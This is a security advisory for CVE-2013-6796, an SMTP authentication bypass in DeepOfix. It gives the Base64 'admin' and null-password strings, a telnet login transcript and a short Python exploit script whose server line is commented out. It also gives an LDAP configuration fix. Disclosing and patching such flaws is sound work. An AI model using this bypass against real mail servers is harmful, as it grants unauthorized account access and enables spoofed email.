@@ -1,0 +1,109 @@
+======================================================================================
+Vulnerability:   Bypass authentication and gain unauthorized access to SMTP server
+======================================================================================
+Platform:        DeepOfix
+Version:	 <= 3.3 (All versions tested)
+Vendor: 	 Deep Root Linux - http://www.deeproot.in
+Date:	 	 2013/11/06
+Discovered by:   Gerardo Vazquez, Eduardo Arriols 
+		 	[Pragsis-Security - http://pragsis-security.com/]
+Severity:        7.5/10 (CVSS Base Score)
+CVE:		 2013-6796
+======================================================================================
+
+1. Background
+**************************************************************************************
+ DeepOfix is a free ISO of DeepRootLinux to mount a mail server providing users the 
+ ability to send emails via SMTP, check e-mail via IMAP, access the files via FTP or
+ SSH...
+
+
+2. Problem Description
+**************************************************************************************
+ The vulnerability allows an attacker to bypass the authentication in the SMTP server
+ to send emails. The problem is that the SMTP server performs authentication against 
+ LDAP by default, and the service does not check that the password is null if this 
+ Base64. This creates a connection "anonymous" but with a user account without entering
+ the password.
+
+ It is important to note that the same could be used with other services also 
+ validate against LDAP.
+
+
+3. Impact
+**************************************************************************************
+ An Attacker could login in the SMTP server knowing only the username of one user in the
+ server and he could sends emails. One important thing is that the user "admin" always 
+ exists in the server.
+
+	
+4. Expotation
+**************************************************************************************
+ To authenticate against the SMTP server can make the login is done using Base64, so if
+ you enter the user "admin" and password null or '\0' in Base64 give us access server as 
+ "admin" without checking the password.
+
+   The credentials in Base64:
+
+	User: "admin" ===> "YWRtaW4="
+	Password: null ==> "AA=="	
+
+   Example of how we could authenticate to the system:
+
+        test@0-day ~ $ telnet deepofix.local 25
+	Trying deepofix.local...
+	Connected to deepofix.local.
+	Escape character is '^]'.
+	220 deepofix.local ESMTP 
+	auth login				# In ASCCI:
+	334 VXNlcm5hbWU6			# 334 Username:
+	YWRtaW4=				# admin
+	334 UGFzc3dvcmQ6			# 334 Password:
+	AA==    				# \0
+	235 nice to meet you			
+	
+   Now we would be authenticated as "admin" so we could send emails from that account.
+
+
+   Simple exploit in Python [exploit.py]:
+	-----------------------------------------------------------------
+	| import smtplib						|
+	|								|
+	| # Select the sender and the receivers				|
+	| sender = 'sender@mail'					|
+	| receivers = ['receiver@mail.com']				|
+	| 								|
+	| # Write the message						|
+	| message = """							|
+	| 	From: From Sender <sender@mail.com>			|
+	| 	To: To Receiver <receiver@mail.com>			|
+	| 	Subject: NSA is watching you!				|
+	| 								|
+	| 	This is a really important message... xD		|
+	| 	"""							|
+	| 								|
+	| # Connect to the SMTP server and send the email		|
+	| try:								|
+	| 	# server = smtplib.SMTP('deepofix.local', 25) 		|
+	| 								|
+	| 	# Auth login --> admin/null in Base64			|
+	| 	server.docmd("auth login")				|
+	| 	server.docmd("YWRtaW4=")				|
+	| 	server.docmd("AA==")					|
+	| 								|
+	| 	server.sendmail(sender, receivers, message)         	|
+	| 	print "Successfully sent email"				|
+	| 								|
+	| except:							|
+	|    	print "Error: unable to send email"        		|
+	-----------------------------------------------------------------
+	
+
+5. Solution
+**************************************************************************************
+ To solve the problem we have only ban the anonymous LDAP bind.
+
+ It is done by editing /var/easypush/ldap/etc/openldap/slapd.conf and add
+ the line "disallow bind_anon". After you restart the ldap service with:
+	sv term slapd
+	slapd sv status
